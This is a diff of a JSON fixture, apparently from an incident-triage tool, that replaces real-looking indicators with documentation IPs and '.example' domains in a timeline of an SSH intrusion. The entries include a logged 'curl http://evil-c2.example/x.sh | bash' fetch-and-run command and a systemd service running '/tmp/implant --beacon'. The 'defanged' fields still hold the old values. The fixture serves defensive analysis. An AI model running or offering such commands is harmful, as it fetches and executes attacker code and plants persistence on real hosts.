@@ -94,7 +94,7 @@
   "iocs": [
     {
       "type": "ipv4",
-      "value": "91.219.236.14",
+      "value": "203.0.113.14",
       "defanged": "91[.]219[.]236[.]14",
       "count": 8,
       "private": false,
@@ -106,7 +106,7 @@
     },
     {
       "type": "domain",
-      "value": "evil-c2.top",
+      "value": "evil-c2.example",
       "defanged": "evil-c2[.]top",
       "count": 1,
       "private": false,
@@ -116,7 +116,7 @@
     },
     {
       "type": "url",
-      "value": "http://evil-c2.top/x.sh",
+      "value": "http://evil-c2.example/x.sh",
       "defanged": "hxxp://evil-c2[.]top/x[.]sh",
       "count": 1,
       "private": false,
@@ -261,20 +261,20 @@
       {
         "timestamp": "2026-07-14T02:00:09Z",
         "kind": "inicio de sesión",
-        "summary": "root@91.219.236.14",
+        "summary": "root@203.0.113.14",
         "detail": "tty pts/0",
         "severity": "info",
         "user": "root",
-        "host": "91.219.236.14"
+        "host": "203.0.113.14"
       },
       {
         "timestamp": "2026-07-14T02:00:01Z",
         "kind": "acceso fallido",
-        "summary": "admin@91.219.236.14",
+        "summary": "admin@203.0.113.14",
         "detail": "tty ssh:notty",
         "severity": "warn",
         "user": "admin",
-        "host": "91.219.236.14"
+        "host": "203.0.113.14"
       }
     ],
     "logs": [
@@ -295,21 +295,21 @@
       {
         "timestamp": "2026-07-14T02:00:09Z",
         "kind": "SSH correcto",
-        "summary": "root@91.219.236.14",
+        "summary": "root@203.0.113.14",
         "detail": "vía publickey",
         "severity": "warn"
       },
       {
         "timestamp": "2026-07-14T02:00:03Z",
         "kind": "SSH fallido",
-        "summary": "admin@91.219.236.14",
+        "summary": "admin@203.0.113.14",
         "detail": "contraseña incorrecta",
         "severity": "warn"
       },
       {
         "timestamp": "2026-07-14T02:00:01Z",
         "kind": "SSH fallido",
-        "summary": "admin@91.219.236.14",
+        "summary": "admin@203.0.113.14",
         "detail": "contraseña incorrecta",
         "severity": "warn"
       }
@@ -326,7 +326,7 @@
       {
         "timestamp": null,
         "kind": "comando",
-        "summary": "curl http://evil-c2.top/x.sh | bash",
+        "summary": "curl http://evil-c2.example/x.sh | bash",
         "detail": "jdoe",
         "severity": "warn"
       },
@@ -349,7 +349,7 @@
       {
         "timestamp": "2026-07-14T20:14:32Z",
         "kind": "servicio systemd",
-        "summary": "/tmp/implant --beacon 91.219.236.14",
+        "summary": "/tmp/implant --beacon 203.0.113.14",
         "detail": "evil.service",
         "severity": "info"
       },
@@ -408,7 +408,7 @@
       "timestamp": "2026-07-14T20:14:32Z",
       "source": "Persistencia",
       "type": "servicio systemd",
-      "summary": "/tmp/implant --beacon 91.219.236.14",
+      "summary": "/tmp/implant --beacon 203.0.113.14",
       "detail": "evil.service",
       "severity": "info"
     },
@@ -472,7 +472,7 @@
       "timestamp": "2026-07-14T02:00:09Z",
       "source": "Accesos",
       "type": "inicio de sesión",
-      "summary": "root@91.219.236.14",
+      "summary": "root@203.0.113.14",
       "detail": "tty pts/0",
       "severity": "info"
     },
@@ -480,7 +480,7 @@
       "timestamp": "2026-07-14T02:00:09Z",
       "source": "Logs",
       "type": "SSH correcto",
-      "summary": "root@91.219.236.14",
+      "summary": "root@203.0.113.14",
       "detail": "vía publickey",
       "severity": "warn"
     },
@@ -488,7 +488,7 @@
       "timestamp": "2026-07-14T02:00:03Z",
       "source": "Logs",
       "type": "SSH fallido",
-      "summary": "admin@91.219.236.14",
+      "summary": "admin@203.0.113.14",
       "detail": "contraseña incorrecta",
       "severity": "warn"
     },
@@ -496,7 +496,7 @@
       "timestamp": "2026-07-14T02:00:01Z",
       "source": "Accesos",
       "type": "acceso fallido",
-      "summary": "admin@91.219.236.14",
+      "summary": "admin@203.0.113.14",
       "detail": "tty ssh:notty",
       "severity": "warn"
     },
@@ -504,7 +504,7 @@
       "timestamp": "2026-07-14T02:00:01Z",
       "source": "Logs",
       "type": "SSH fallido",
-      "summary": "admin@91.219.236.14",
+      "summary": "admin@203.0.113.14",
       "detail": "contraseña incorrecta",
       "severity": "warn"
     }
